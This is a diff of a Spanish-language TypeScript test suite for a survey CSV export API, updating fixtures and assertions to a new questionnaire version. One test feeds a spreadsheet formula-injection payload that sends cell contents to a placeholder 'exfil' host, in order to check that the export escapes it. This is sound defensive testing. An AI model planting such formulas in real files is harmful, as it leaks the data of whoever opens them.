@@ -51,6 +51,9 @@ const RUTA = '/api/encuestas/export.csv';
 const FILTRO = { dateFrom: '2026-07-01', dateTo: '2026-07-31' };
 const ENCABEZADOS = ENCUESTAS_CSV_HEADERS.join(',');
 
+// Orden de los gobernantes en el pivoteo del CSV (debe coincidir con GOBERNANTES_V3).
+const GOBERNANTES_ESPERADOS = ['sheinbaum', 'jara', 'huerta'];
+
 type Encabezado = (typeof ENCUESTAS_CSV_HEADERS)[number];
 
 /**
@@ -74,26 +77,23 @@ function encuestaCompletada(overrides: Partial<EncuestaExportRow> = {}): Encuest
     fechaHoraFinalizacion: new Date('2026-07-30T10:06:40.000Z'),
     duracionSegundos: 400,
     estado: 'completada',
-    elegibilidad: 'elegible',
-    versionCuestionario: 1,
-    credencialVigente: 'si',
+    versionCuestionario: 3,
+    sexo: 'mujer',
     rangoEdad: '30_44',
-    genero: 'mujer',
-    partidoPreferido: 'morena',
-    // Desordenadas a propósito: el CSV las coloca por catálogo, no por el orden
-    // en que las mandó el teléfono.
-    conocimientoPorPersona: [
-      { persona: 'ernesto_montero', nivel: 'no_conoce' },
-      { persona: 'lalo_ximenez', nivel: 'bien' },
-      { persona: 'laura_estrada', nivel: 'algo' },
-      { persona: 'paco_nino', nivel: 'poco' },
-      { persona: 'gabriela_delgado', nivel: 'no_conoce' },
-      { persona: 'irineo_molina', nivel: 'bien' },
-      { persona: 'goyo_castaneda', nivel: 'poco' },
+    // Listas de nombres en el orden del encuestador.
+    empresariosConocidos: ['Carlos Slim', 'Marianna Sarlat'],
+    politicosConocidos: ['López Obrador', 'Cortés Mendoza'],
+    conoceLalo: 'si',
+    rolLalo: 'empresario',
+    opinionLalo: 'fuerte',
+    preferenciaElectoral: 'lalo_ximenez',
+    preferenciaPartido: 'morena',
+    // Pivoteo: [{ gobernante: 'sheinbaum', calificacion: 'fuerte' }, ...]
+    aprobacionPorGobernante: [
+      { gobernante: 'sheinbaum', calificacion: 'fuerte' },
+      { gobernante: 'jara', calificacion: 'regular' },
+      { gobernante: 'huerta', calificacion: 'debil' },
     ],
-    mediosConocimiento: { tipo: 'respondida', medios: ['labor_social', 'redes_sociales'] },
-    mayorPersonalidad: 'lalo_ximenez',
-    candidatoPreferido: 'irineo_molina',
     ubicacionDisponible: true,
     ubicacionLat: 19.432608,
     ubicacionLng: -99.133209,
@@ -112,7 +112,7 @@ function encuestaCompletada(overrides: Partial<EncuestaExportRow> = {}): Encuest
   };
 }
 
-/** Credencial no vigente: P2–P8 no se almacenan, así que llegan en NULL. */
+/** En v3 una fila de residual v1 puede llegar con campos nulos. */
 function encuestaNoElegible(overrides: Partial<EncuestaExportRow> = {}): EncuestaExportRow {
   return encuestaCompletada({
     id: 2,
@@ -121,16 +121,17 @@ function encuestaNoElegible(overrides: Partial<EncuestaExportRow> = {}): Encuest
     folioLocal: null,
     // Capturada por una app anterior al campo: la columna sale vacía.
     encuestador: null,
-    estado: 'noElegible',
-    elegibilidad: 'noElegible',
-    credencialVigente: 'no',
+    versionCuestionario: 1,
+    sexo: null,
     rangoEdad: null,
-    genero: null,
-    partidoPreferido: null,
-    conocimientoPorPersona: null,
-    mediosConocimiento: null,
-    mayorPersonalidad: null,
-    candidatoPreferido: null,
+    empresariosConocidos: null,
+    politicosConocidos: null,
+    conoceLalo: null,
+    rolLalo: null,
+    opinionLalo: null,
+    preferenciaElectoral: null,
+    preferenciaPartido: null,
+    aprobacionPorGobernante: null,
     ubicacionDisponible: false,
     ubicacionLat: null,
     ubicacionLng: null,
@@ -158,21 +159,11 @@ describe('HEAD /api/encuestas/export.csv', () => {
     expect(response.status).toBe(200);
     expect(response.headers['content-type']).toContain('text/csv');
     expect(response.headers['content-disposition']).toContain(
-      'encuestas-todas-2026-07-01_2026-07-31.csv',
+      'encuestas-2026-07-01_2026-07-31.csv',
     );
     expect(response.headers['cache-control']).toBe('private, no-store');
     expect(response.text ?? '').toBe('');
     expect(iterateForExport).not.toHaveBeenCalled();
-  });
-
-  it('el estado filtrado va en el nombre del archivo', async () => {
-    const response = await request(crearApp())
-      .head(RUTA)
-      .query({ ...FILTRO, estado: 'noElegible' });
-
-    expect(response.headers['content-disposition']).toContain(
-      'encuestas-noElegible-2026-07-01_2026-07-31.csv',
-    );
   });
 });
 
@@ -191,23 +182,22 @@ describe('GET /api/encuestas/export.csv', () => {
     expect(ENCUESTAS_CSV_HEADERS.some((h) => /payload|hash/i.test(h))).toBe(false);
   });
 
-  it('reenvía los filtros del revisor al servicio', async () => {
+  it('reenvía los filtros del revisor al servicio (sin estado en v3)', async () => {
     // eslint-disable-next-line require-yield
     iterateForExport.mockImplementation(async function* () {});
 
     await request(crearApp())
       .get(RUTA)
-      .query({ ...FILTRO, estado: 'completada', dispositivo: 'encuestador' });
+      .query({ ...FILTRO, dispositivo: 'encuestador' });
 
     expect(iterateForExport.mock.calls[0][0]).toEqual({
-      estado: 'completada',
       dispositivo: 'encuestador',
       dateFrom: '2026-07-01',
       dateTo: '2026-07-31',
     });
   });
 
-  it('pivotea P5 y aplana P6, y deja vacías las columnas de la encuesta no elegible', async () => {
+  it('pivotea aprobación por gobernante y une listas de nombres, deja vacías las columnas de encuesta v1', async () => {
     iterateForExport.mockImplementation(async function* () {
       yield [encuestaCompletada(), encuestaNoElegible()];
     });
@@ -216,7 +206,7 @@ describe('GET /api/encuestas/export.csv', () => {
 
     expect(response.status).toBe(200);
     expect(response.headers['content-disposition']).toContain(
-      'encuestas-todas-2026-07-01_2026-07-31.csv',
+      'encuestas-2026-07-01_2026-07-31.csv',
     );
 
     const lineas = response.text.split('\r\n');
@@ -230,18 +220,14 @@ describe('GET /api/encuestas/export.csv', () => {
     // Quien levantó la encuesta, tal como lo tecleó el teléfono.
     expect(celda(lineas[1], 'Encuestador')).toBe('María López');
 
-    // Cada nivel bajo la columna de SU persona, con el orden del catálogo v1.
-    expect(celda(lineas[1], 'Conoce lalo_ximenez')).toBe('bien');
-    expect(celda(lineas[1], 'Conoce laura_estrada')).toBe('algo');
-    expect(celda(lineas[1], 'Conoce paco_nino')).toBe('poco');
-    expect(celda(lineas[1], 'Conoce gabriela_delgado')).toBe('no_conoce');
-    expect(celda(lineas[1], 'Conoce irineo_molina')).toBe('bien');
-    expect(celda(lineas[1], 'Conoce goyo_castaneda')).toBe('poco');
-    expect(celda(lineas[1], 'Conoce ernesto_montero')).toBe('no_conoce');
+    // Listas de nombres unidas con ;
+    expect(celda(lineas[1], 'Empresarios conocidos')).toBe('Carlos Slim;Marianna Sarlat');
+    expect(celda(lineas[1], 'Políticos conocidos')).toBe('López Obrador;Cortés Mendoza');
 
-    // P6: el orden lo fija MEDIOS_V1, no el del teléfono (que los mandó al revés).
-    expect(celda(lineas[1], 'Medios (tipo)')).toBe('respondida');
-    expect(celda(lineas[1], 'Medios')).toBe('redes_sociales;labor_social');
+    // Pivoteo de aprobación por gobernante.
+    expect(celda(lineas[1], 'Aprobación sheinbaum')).toBe('fuerte');
+    expect(celda(lineas[1], 'Aprobación jara')).toBe('regular');
+    expect(celda(lineas[1], 'Aprobación huerta')).toBe('debil');
 
     // Fechas en UTC y booleanos como si/no.
     expect(celda(lineas[1], 'Recibido (UTC)')).toBe('2026-07-30T10:07:05.000Z');
@@ -252,25 +238,14 @@ describe('GET /api/encuestas/export.csv', () => {
     // Las coordenadas NO llevan apóstrofo: son números, no fórmulas.
     expect(celda(lineas[1], 'Longitud')).toBe('-99.133209');
 
-    // La no elegible: sin P5/P6 y sin las respuestas P2–P8.
-    for (const persona of [
-      'Conoce lalo_ximenez',
-      'Conoce laura_estrada',
-      'Conoce paco_nino',
-      'Conoce gabriela_delgado',
-      'Conoce irineo_molina',
-      'Conoce goyo_castaneda',
-      'Conoce ernesto_montero',
-    ] as const) {
-      expect(celda(lineas[2], persona)).toBe('');
-    }
-    expect(celda(lineas[2], 'Medios (tipo)')).toBe('');
-    expect(celda(lineas[2], 'Medios')).toBe('');
-    // El encuestador que no llegó es celda vacía, no la palabra "null".
+    // La encuesta v1 residual: campos nulos salen como celdas vacías.
     expect(celda(lineas[2], 'Encuestador')).toBe('');
-    expect(celda(lineas[2], 'Partido preferido')).toBe('');
-    expect(celda(lineas[2], 'Candidato preferido')).toBe('');
-    expect(celda(lineas[2], 'Credencial vigente')).toBe('no');
+    expect(celda(lineas[2], 'Empresarios conocidos')).toBe('');
+    expect(celda(lineas[2], 'Políticos conocidos')).toBe('');
+    expect(celda(lineas[2], 'Conoce Lalo')).toBe('');
+    expect(celda(lineas[2], 'Aprobación sheinbaum')).toBe('');
+    expect(celda(lineas[2], 'Aprobación jara')).toBe('');
+    expect(celda(lineas[2], 'Aprobación huerta')).toBe('');
     expect(celda(lineas[2], 'Ubicación disponible')).toBe('no');
     // NULL no es "no": la lectura de GPS no existe, no es que fuera inválida.
     expect(celda(lineas[2], 'Ubicación válida')).toBe('');
@@ -281,19 +256,21 @@ describe('GET /api/encuestas/export.csv', () => {
     expect(registrado.error).not.toHaveBeenCalled();
   });
 
-  // El modelo del teléfono es texto libre que llega con una API key válida: sin
+  // Texto libre de listas del encuestador que llega con una API key válida: sin
   // neutralizar, Excel ejecuta la celda al abrir el archivo.
-  it('neutraliza una fórmula inyectada en el modelo del dispositivo', async () => {
+  it('neutraliza una fórmula inyectada en la lista de políticos conocidos', async () => {
     iterateForExport.mockImplementation(async function* () {
-      yield [encuestaCompletada({ dispositivoModelo: '=HYPERLINK("http://exfil/?"&A2,"ok")' })];
+      yield [encuestaCompletada({ politicosConocidos: ['=HYPERLINK("http://exfil/?"&A2,"ok")', 'López Obrador'] })];
     });
 
     const response = await request(crearApp()).get(RUTA).query(FILTRO);
 
     expect(response.status).toBe(200);
-    expect(response.text).toContain(`"'=HYPERLINK(""http://exfil/?""&A2,""ok"")"`);
-    // La celda ya no empieza por '=': Excel la lee como texto.
-    expect(response.text).not.toContain(',=HYPERLINK');
+    // La lista se une con ; y escapa la entrada con la fórmula.
+    expect(response.text).toContain(`"'=HYPERLINK(""http://exfil/?""&A2,""ok"");López Obrador"`);
+    // No debe aparecer como celda sin escape (inicio de fórmula sin comilla):
+    // si la fórmula hubiera llegado sin escape, vería ,=HYPERLINK sin comilla tras la coma.
+    expect(response.text).not.toContain('Políticos conocidos,=HYPERLINK');
   });
 
   it('rechaza con 400 un rango mayor a 366 días', async () => {
